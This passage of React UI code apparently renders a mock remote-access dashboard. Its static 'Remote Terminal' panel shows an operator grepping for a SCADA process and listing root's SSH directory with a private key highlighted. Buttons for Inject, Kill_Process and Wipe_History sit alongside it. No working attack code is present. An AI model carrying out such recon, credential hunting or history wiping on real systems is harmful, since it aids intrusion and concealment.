                                   <span className="text-[9px] text-slate-400 font-bold tracking-tight text-center bg-slate-900/40 px-2 py-0.5 rounded-full border border-slate-800/40">{icon.name}</span>
                                </motion.div>
                             ))}
                          </div>

                          {/* Taskbar */}
                          <div className="mt-auto w-full h-12 bg-slate-900/40 backdrop-blur-xl border-t border-white/5 flex items-center px-5 space-x-8 z-10">
                             <div className="w-8 h-8 rounded-full bg-gradient-to-br from-cyan-500 to-blue-600 flex items-center justify-center shadow-lg shadow-cyan-500/20 active:scale-95 transition-transform cursor-pointer">
                                <Globe className="w-4 h-4 text-white" />
                             </div>
                             <div className="flex space-x-2">
                                {[1,2,3,4].map(i => (
                                   <div key={i} className="w-8 h-8 bg-white/5 hover:bg-white/10 rounded-xl border border-white/5 flex items-center justify-center text-xs opacity-60 hover:opacity-100 transition-all cursor-pointer">
                                      {i === 1 ? '📂' : i === 2 ? '🐚' : i === 3 ? '💬' : '🛠️'}
                                   </div>
                                ))}
                             </div>
                             <div className="ml-auto flex items-center space-x-6">
                                <div className="flex flex-col items-end">
                                   <span className="text-[7px] font-black text-slate-500 uppercase tracking-widest leading-none mb-0.5">LOCAL_UPLINK</span>
                                   <span className="text-[10px] font-mono text-cyan-400 leading-none">{sessions.find(s => s.id === selectedSessionId)?.host}</span>
                                </div>
                                <div className="h-6 w-px bg-white/5"></div>
                                <div className="text-[11px] font-mono text-slate-300 font-bold">{new Date().toLocaleTimeString([], { hour12: false, hour: '2-digit', minute: '2-digit' })}</div>
                             </div>
                          </div>

                          {/* Scan Line Overlay - More subtle */}
                          <div className="absolute inset-0 pointer-events-none bg-[linear-gradient(rgba(18,16,16,0)_50%,rgba(0,0,0,0.05)_50%)] bg-[length:100%_4px] z-20"></div>
                          <div className="absolute inset-0 pointer-events-none bg-[radial-gradient(circle_at_center,transparent_0%,rgba(0,0,0,0.2)_100%)] z-20"></div>
                       </div>
                       
                       {/* Control Overlays */}
                       <div className="absolute inset-x-0 bottom-16 p-4 flex justify-center opacity-0 group-hover:opacity-100 transition-all translate-y-4 group-hover:translate-y-0">
                          <div className="px-6 py-3 bg-slate-950/90 border border-white/10 rounded-full flex items-center space-x-8 text-[10px] font-black text-slate-400 uppercase tracking-widest shadow-[0_20px_50px_rgba(0,0,0,0.5)] backdrop-blur-2xl">
                             <button className="hover:text-red-500 transition-colors flex items-center space-x-2">
                                <Monitor className="w-3.5 h-3.5" />
                                <span>Capture</span>
                             </button>
                             <div className="w-px h-4 bg-white/5"></div>
                             <button className="hover:text-cyan-500 transition-colors flex items-center space-x-2">
                                <Lock className="w-3.5 h-3.5" />
                                <span>Input_Lock</span>
                             </button>
                             <div className="w-px h-4 bg-white/5"></div>
                             <button className="hover:text-emerald-500 transition-colors flex items-center space-x-2 font-black text-emerald-400">
                                <Zap className="w-3.5 h-3.5" />
                                <span>Inject</span>
                             </button>
                             <div className="w-px h-4 bg-white/5"></div>
                             <button className="text-red-600 hover:text-red-500 font-black">Disconnect</button>
                          </div>
                       </div>
                    </div>
                 </div>

                 {/* Terminal View */}
                 <div className="lg:col-span-12 xl:col-span-4 glass p-6 rounded-3xl border-slate-800 bg-slate-950/80 border-l-4 border-l-red-500 flex flex-col">
                    <div className="flex items-center justify-between mb-4">
                       <div className="flex items-center space-x-2">
                          <TerminalIcon className="w-4 h-4 text-red-500" />
                          <h4 className="text-[10px] font-black text-white uppercase tracking-widest">Remote Terminal</h4>
                       </div>
                    </div>
                    
                    <div className="flex-grow bg-black/60 rounded-xl border border-slate-800 p-4 font-mono text-[9px] text-red-400/80 overflow-y-auto mb-4 min-h-[300px]">
                       <div className="space-y-1">
                          <p className="text-slate-600">STIA-Access Engine v2.1.2</p>
                          <p className="text-slate-600 mb-2">Authenticated on: <span className="text-cyan-500">{sessions.find(s => s.id === selectedSessionId)?.host || 'PENDING'}</span> as <span className="text-emerald-500">{sessions.find(s => s.id === selectedSessionId)?.user || 'guest'}</span></p>
                          
                          <p><span className="text-green-500">access-node:</span><span className="text-blue-500">~</span>$ ps aux | grep scada</p>
                          <p className="pl-4 text-amber-500">root      4122  0.1  0.2 124232  8422 ?        Ssl  Apr25   0:15 /usr/bin/scada_monitor --daemon</p>
                          <p><span className="text-green-500">access-node:</span><span className="text-blue-500">~</span>$ ls -lha /root/.ssh/</p>
                          <p className="pl-4">total 24K</p>
                          <p className="pl-4">drwx------  2 root root 4.0K Apr 10 14:22 .</p>
                          <p className="pl-4">drwx------ 10 root root 4.0K Apr 25 09:12 ..</p>
                          <p className="pl-4 text-emerald-500">-rw-------  1 root root  422 Apr 10 14:22 id_rsa</p>
                          <p className="pl-4">-rw-r--r--  1 root root  112 Apr 10 14:22 authorized_keys</p>
                          <p><span className="text-green-500">access-node:</span><span className="text-blue-500">~</span>$ <span className="animate-pulse">_</span></p>
                       </div>
                    </div>

                    <div className="grid grid-cols-2 gap-2">
                       <button className="flex items-center space-x-2 justify-center p-3 bg-slate-900 border border-slate-800 rounded-xl hover:border-red-500/50 transition-all group">
                          <Cpu className="w-3.5 h-3.5 text-slate-500 group-hover:text-red-500" />
                          <span className="text-[8px] font-black text-slate-600 group-hover:text-white uppercase tracking-widest">Kill_Process</span>
                       </button>
                       <button className="flex items-center space-x-2 justify-center p-3 bg-slate-900 border border-slate-800 rounded-xl hover:border-red-500/50 transition-all group">
                          <ShieldCheck className="w-3.5 h-3.5 text-slate-500 group-hover:text-red-500" />
                          <span className="text-[8px] font-black text-slate-600 group-hover:text-white uppercase tracking-widest">Wipe_History</span>
                       </button>
                    </div>
                 </div>
              </div>
           </div>
        </div>
      </div>
  );
};
